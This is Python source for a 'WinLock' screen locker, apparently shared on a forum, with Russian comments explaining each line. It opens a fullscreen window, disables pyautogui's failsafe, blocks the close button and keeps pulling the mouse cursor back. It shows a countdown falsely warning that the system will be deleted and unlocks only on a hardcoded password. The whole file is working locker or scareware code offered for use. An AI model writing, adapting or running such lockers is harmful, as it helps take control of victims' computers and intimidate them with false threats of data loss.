from tkinter import *  
import pyautogui  
import pygame  
read1ng=" " 
password=("abdul") 
t1me=7200 
d3l="Удаление системы..." 


def block(): 
    pyautogui.click(x=767)
    pyautogui.moveTo(x=820,y=480) 
    screen.protocol("WM_DELETE_WINDOW",block)
    screen.update()
def password_check(event): 
    global read1ng
    read1ng=field.get() 
    if read1ng==password: 
        screen.destroy() 
        
        
screen=Tk() 
screen.title("WinLock vlmi.biz") 
screen.attributes("-fullscreen",True) #задаем окну атрибут - "на весь экран",который являетя правдой/активным.
screen.configure(background="#1c1c1c") 
pyautogui.FAILSAFE=False #отключение остановки библиотеки autogui при дерганьи мышки. Если не включить это, то при дергание мышки pyautogui просто прекратит выполнять все действия.
field=Entry(screen,fg="green",justify=CENTER) #создаем переменную,которая равняется полю для ввода,которое расположено на нашем окне(screen),цвет для текста - зеленый, текст будет по центру.
but=Button(screen,text="UNBLOCK") #создаем переменную,которая равняется кнопке,которая расположена на нашем окне(screen),и имеет на себе надпись("Разблокировать")
text0=Label(screen,text="Your system have been blocked!",font="TimesNewRoman 30",fg="white",bg="#1c1c1c") 
text1=Label(screen,text="Don't reload your computer, it's delete you system",font = "TimesNewRoman 16",fg="red",bg="#1c1c1c") #тоже самое,что и выше
l=Label(text=t1me,font="Arial 22",fg="red",bg="#1c1c1c") # так же как и выше,только здесь текст равен переменной(t1me),которая стоит у нас в начале и имеет значение 7200.
l1=Label(text="Left to  delete... :",fg="white",bg="#1c1c1c",font="Arial 15") #простая надпись как и выше
but.bind('<Button-1>',password_check) #к переменной but(нашей кнопке) мы привязываем функцию password_check,которая выполнится при нажатии ЛКМ

field.place(width=150,height=50,x=800,y=350) #переменной field мы устанавливаем ширину,высоту и отображаем на координатах X и Y
but.place(width=150,height=50,x=800,y=470) #переменной but мы устанавливаем ширину,высоту и отображаем на координатах X и Y
text0.place(x=610,y=100) #переменную text0 мы отображаем на координатах X и Y
text1.place(x=610,y=250) #переменную text1 мы отображаем на координатах X и Y
l1.place(x=20,y=70) #переменную l1 мы отображаем на координатах X и Y
l.place(x=20,y=100) #переменную l мы отображаем на координатах X и Y

pygame.init() #



screen.update() 
pyautogui.click(x=675,y=325)
pyautogui.moveTo(x=660,y=410) 

while read1ng!=password:
    l.configure(text=t1me) 
    screen.after(300) 
    if t1me==0:
        t1me=d3l 

    if t1me!=d3l: 
        t1me=t1me-1 
    block() 
